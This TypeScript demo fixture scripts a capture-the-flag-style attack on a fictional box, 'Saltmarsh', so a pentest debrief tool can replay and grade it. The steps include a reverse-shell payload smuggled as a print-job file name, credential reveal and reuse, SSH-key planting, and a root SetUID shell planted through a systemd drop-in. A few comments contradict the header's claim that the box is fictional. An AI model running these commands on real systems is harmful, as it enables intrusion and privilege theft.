/**
 * A scripted end-to-end playthrough of a FICTIONAL practice box ("Saltmarsh", on the invented
 * "Breachyard" platform), used to demo the debrief live: DemoDriver streams these commands into the
 * store one at a time, recording: true, so you can watch the report build (phase advancing, stealth
 * burning, flags landing) and resolve into the final graded debrief. No real box, no capture agent,
 * browser-only. All hosts, names, flags and credentials are invented; nothing here is copied from
 * any real platform's machine, artwork or write-up. The command path is a generic Linux chain
 * (SMB/RPC recon, a print-spooler command injection, a reused backup credential, a Samba wide-links
 * + force-user SSH-key plant, and a writable systemd drop-in to root) with reconstructed outputs.
 */
import type { GoldenObjective, Session } from "../../types/report";
import { buildRaw, makeDemo, type Step } from "./build";

const START = Date.parse("2026-07-07T19:00:00Z");

const STEPS: Step[] = [
  // --- Recon: ports, NetBIOS, SMB shares, RPC null-session ---
  { cmd: "nmap -p- --min-rate 10000 saltmarsh.range", gap: 2_000, dur: 48_000, lines: 9, volume: 2000, out: "22/tcp ssh · 139/tcp netbios-ssn · 445/tcp microsoft-ds · full TCP sweep" },
  { cmd: "nmap -p 22,139,445 -sCV saltmarsh.range", gap: 15_000, dur: 22_000, lines: 18, volume: 100, out: "22/tcp OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 · 139,445/tcp Samba smbd 4.6.2 · looks like Ubuntu 24.04 LTS" },
  { cmd: "nmblookup -A saltmarsh.range", gap: 20_000, dur: 3_000, lines: 7, out: "SALTMARSH <00><03><20> B · WORKGROUP <00><1d><1e> · <20> set, File Server Service is up" },
  { cmd: "smbclient -L //saltmarsh.range/ -N", gap: 12_000, dur: 3_500, lines: 9, out: "HP-Reception (Printer) · projects (Disk) · transfer (Disk) · IPC$ · anonymous listing succeeds" },
  { cmd: 'rpcclient -N saltmarsh.range -U "" -c enumdomusers', gap: 10_000, dur: 2_200, lines: 1, out: "user:[scott] rid:[0x3e8] · single domain user, null session" },
  { cmd: 'rpcclient -N saltmarsh.range -U "" -c netshareenumall', gap: 6_000, dur: 2_600, lines: 9, out: "HP-Reception -> C:\\var\\spool\\samba · projects -> C:\\srv\\projects · transfer -> C:\\srv\\transfer" },

  // --- Exploitation: CVE-2026-4480, Samba print-job command injection ---
  { cmd: "echo 'bash -i >& /dev/tcp/x.x.x.x/443 0>&1' > '|bash'", gap: 240_000, dur: 400, lines: 1, out: "payload written · the print command forwards the job description through %J unescaped (CVE-2026-4480)" },
  { cmd: "nc -lnvp 443", gap: 8_000, dur: 600, lines: 1, out: "listening on [any] 443 ..." },
  { cmd: 'smbclient //saltmarsh.range/HP-Reception -N -c \'print "|bash"\'', gap: 5_000, dur: 2_800, lines: 2, out: 'putting file |bash as the print job · job description runs as a shell command · nobody@saltmarsh:/var/spool/samba$ (caught on the listener)' },
  { cmd: "script /dev/null -c bash", gap: 6_000, dur: 1_800, lines: 1, out: "nobody@saltmarsh:/var/spool/samba$ · upgraded to a full tty" },
  { cmd: "whoami", gap: 4_000, dur: 300, lines: 1, out: "nobody" },
  { cmd: "id", gap: 2_500, dur: 300, lines: 1, out: "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)" },

  // --- Privesc to scott: offsite-backup rclone config, reveal, su ---
  { cmd: "cat /etc/passwd | grep 'sh$'", gap: 25_000, dur: 700, lines: 3, out: "root:x:0:0:root:/root:/bin/bash · scott:x:1000:1001:Scott Hale:/home/scott:/bin/bash · marcus:x:1001:1002:Marcus Orr:/home/marcus:/bin/bash" },
  { cmd: "ls /opt/offsite-backup", gap: 35_000, dur: 500, lines: 2, out: "rclone.conf  sync.sh" },
  { cmd: "cat /opt/offsite-backup/rclone.conf", gap: 4_000, dur: 400, lines: 5, out: "[offsite] type = sftp · host = backup.saltworks.internal · user = svc-backup · pass = [redacted] (rclone-obscured)" },
  { cmd: "rclone reveal [redacted]", gap: 15_000, dur: 700, lines: 1, out: "[redacted] · plaintext offsite-backup password" },
  { cmd: "su - scott", gap: 10_000, dur: 2_000, lines: 2, out: "Password: [redacted] · scott@saltmarsh:~$ · the offsite-backup password is reused for the local account" },
  { cmd: "cat user.txt", gap: 90_000, dur: 400, lines: 1, out: "[redacted-flag]" },

  // --- Privesc to marcus: Samba wide-links + force user, SSH key injection ---
  { cmd: "cat /etc/samba/shares.conf", gap: 60_000, dur: 900, lines: 8, out: "[transfer] valid users = scott · force user = marcus · read only = no · wide links = yes · (global) allow insecure wide links = yes" },
  { cmd: "ln -s /home/marcus /srv/transfer/marcus-link", gap: 30_000, dur: 400, lines: 1, out: "symlink created · wide links + force user=marcus lets the link resolve outside the share root" },
  { cmd: "smbclient //saltmarsh.range/transfer -U scott%[redacted] -c 'mkdir marcus-link/.ssh; put id_ed25519.pub marcus-link/.ssh/authorized_keys'", gap: 20_000, dur: 3_200, lines: 3, out: "putting id_ed25519.pub as marcus-link\\.ssh\\authorized_keys · written to disk as marcus (force user)" },
  { cmd: "ssh -o IdentityFile=./id_ed25519 marcus@saltmarsh.range", gap: 25_000, dur: 2_500, lines: 1, out: "marcus@saltmarsh:~$ · key-based login, no password needed" },
  { cmd: "id", gap: 3_000, dur: 300, lines: 1, out: "uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators) · marcus is in the operators group" },

  // --- Root: writable systemd drop-in for smbd (operators group), SetUID shell ---
  { cmd: "ls -ld /etc/systemd/system/smbd.service.d/", gap: 40_000, dur: 500, lines: 1, out: "drwxrwxr-x 2 root operators 4096 ... · group-writable by operators" },
  { cmd: 'echo -e \'[Service]\\nExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/.rootbash; chmod 6777 /tmp/.rootbash"\' > /etc/systemd/system/smbd.service.d/override.conf', gap: 45_000, dur: 600, lines: 1, out: "drop-in written · ExecStartPre runs as root the next time smbd (re)starts" },
  { cmd: "systemctl daemon-reload", gap: 6_000, dur: 900, lines: 0, out: "unit files reloaded" },
  { cmd: "systemctl restart smbd", gap: 4_000, dur: 2_400, lines: 1, out: "smbd restarted · ExecStartPre ran as root; /tmp/.rootbash is now a SetUID root bash" },
  { cmd: "/tmp/.rootbash -p", gap: 8_000, dur: 500, lines: 1, out: "bash-5.2# · SetUID shell spawned" },
  { cmd: "whoami", gap: 2_000, dur: 300, lines: 1, out: "root" },
  { cmd: "cat root.txt", gap: 6_000, dur: 400, lines: 1, out: "[redacted-flag]" },
];

const DEMO_END = buildRaw(STEPS, START).at(-1)!.ended_at_ms;

export const SALTMARSH_SESSION: Session = {
  uuid: "demo-saltmarsh-0001-0001-000000000001",
  started_at: new Date(START).toISOString(),
  ended_at: new Date(DEMO_END).toISOString(),
  target_scope: "Breachyard :: Saltmarsh",
  context_path: "host",
  shell: "bash",
  source: "local_pty",
  machine: { name: "Saltmarsh", os: "Linux", difficulty: "Medium", retired: true },
  // Explicit target so this demo renders as HTB with its real machine avatar (hotlinked from HTB's
  // public CDN — no bundled asset, and an <img> hotlink loads cross-origin without the CORS wall
  // that blocks the runtime fetch path). targetOf() returns an explicit session.target as-is.
  target: {
    platform: "breachyard",
    kind: "box",
    name: "Saltmarsh",
    slug: "saltmarsh",
    os: "Linux",
    difficulty: { level: 3, label: "Medium" },
    emblem: {
      avatar: "data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2064%2064%22%3E%3Cpath%20d%3D%22M32%203%2057%2017.5v29L32%2061%207%2046.5v-29Z%22%20fill%3D%22%230e1a2e%22%20stroke%3D%22%232fe6b0%22%20stroke-width%3D%222.6%22%2F%3E%3Ccircle%20cx%3D%2242%22%20cy%3D%2222%22%20r%3D%226.4%22%20fill%3D%22%23f2c26b%22%2F%3E%3Ccircle%20cx%3D%2245%22%20cy%3D%2220%22%20r%3D%225.4%22%20fill%3D%22%230e1a2e%22%2F%3E%3Cpath%20d%3D%22M9%2041q11-6%2023-1t23-2v8L32%2058%209%2046Z%22%20fill%3D%22%232fe6b0%22%20opacity%3D%220.85%22%2F%3E%3Cpath%20d%3D%22M19%2041V30M23%2041V32M27%2041V28M37%2042V33M41%2042V35%22%20stroke%3D%22%239fe9d3%22%20stroke-width%3D%221.7%22%20stroke-linecap%3D%22round%22%2F%3E%3C%2Fsvg%3E",
      hue: null,
    },
    url: null,
  },
};

/**
 * The intended path from the (real) write-up. `audit_share_permissions` (an `smbmap` sweep of
 * share ACLs) is never run in this transcript, so it stays skipped and shows up in "What you'd do
 * differently" — the real run went straight from `smbclient -L` to the print-injection exploit.
 */
export const SALTMARSH_GOLDEN: GoldenObjective[] = [
  { objective: "enumerate_services", tactic: "TA0007", satisfied_by: ["nmap"] },
  { objective: "enumerate_smb_shares", tactic: "TA0007", satisfied_by: ["smbclient -L"], depends_on: ["enumerate_services"] },
  { objective: "enumerate_domain_users", tactic: "TA0007", satisfied_by: ["rpcclient"], depends_on: ["enumerate_services"] },
  { objective: "audit_share_permissions", tactic: "TA0007", satisfied_by: ["smbmap", "crackmapexec --shares"], depends_on: ["enumerate_smb_shares"] },
  { objective: "exploit_print_injection", tactic: "TA0002", satisfied_by: ["echo", "smbclient print"], depends_on: ["enumerate_smb_shares", "enumerate_domain_users"] },
  { objective: "get_foothold", tactic: "TA0002", satisfied_by: ["nc", "ncat"], depends_on: ["exploit_print_injection"] },
  { objective: "orient_as_nobody", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["get_foothold"] },
  { objective: "enumerate_target_users", tactic: "TA0004", satisfied_by: ["cat /etc/passwd"], depends_on: ["get_foothold"] },
  { objective: "discover_offsite_backup_creds", tactic: "TA0004", satisfied_by: ["ls"], depends_on: ["enumerate_target_users"] },
  { objective: "read_rclone_config", tactic: "TA0004", satisfied_by: ["cat /opt/offsite-backup/rclone.conf"], depends_on: ["discover_offsite_backup_creds"] },
  { objective: "reuse_cred_as_scott", tactic: "TA0007", satisfied_by: ["su -"], depends_on: ["read_rclone_config"] },
  { objective: "capture_user_flag", tactic: "TA0004", satisfied_by: ["cat user.txt"], depends_on: ["reuse_cred_as_scott"] },
  { objective: "enumerate_samba_config", tactic: "TA0004", satisfied_by: ["cat /etc/samba/shares.conf"], depends_on: ["capture_user_flag"] },
  { objective: "abuse_wide_links", tactic: "TA0007", satisfied_by: ["ln -s"], depends_on: ["enumerate_samba_config"] },
  { objective: "write_ssh_key_as_marcus", tactic: "TA0007", satisfied_by: ["smbclient -U"], depends_on: ["abuse_wide_links"] },
  { objective: "ssh_as_marcus", tactic: "TA0007", satisfied_by: ["ssh"], depends_on: ["write_ssh_key_as_marcus"] },
  { objective: "find_writable_systemd_dropin", tactic: "TA0004", satisfied_by: ["ls -ld"], depends_on: ["ssh_as_marcus"] },
  { objective: "write_systemd_dropin", tactic: "TA0007", satisfied_by: ["echo"], depends_on: ["find_writable_systemd_dropin"] },
  { objective: "reload_and_restart_smbd", tactic: "TA0007", satisfied_by: ["systemctl"], depends_on: ["write_systemd_dropin"] },
  { objective: "escalate_to_root", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["reload_and_restart_smbd"] },
  { objective: "capture_root_flag", tactic: "TA0004", satisfied_by: ["cat root.txt"], depends_on: ["escalate_to_root"] },
];

/**
 * The fully-resolved demo, built through the shared registry pipeline (build.ts): raw commands,
 * graded report, and stable id all derive from the same STEPS/session/golden above. Pre-registered
 * in the store so an "Saltmarsh" card always shows in History; opening it replays the run live
 * (see runLiveDemo).
 */
export const SALTMARSH = makeDemo({ platform: "breachyard", slug: "saltmarsh", session: SALTMARSH_SESSION, steps: STEPS, golden: SALTMARSH_GOLDEN, startMs: START });
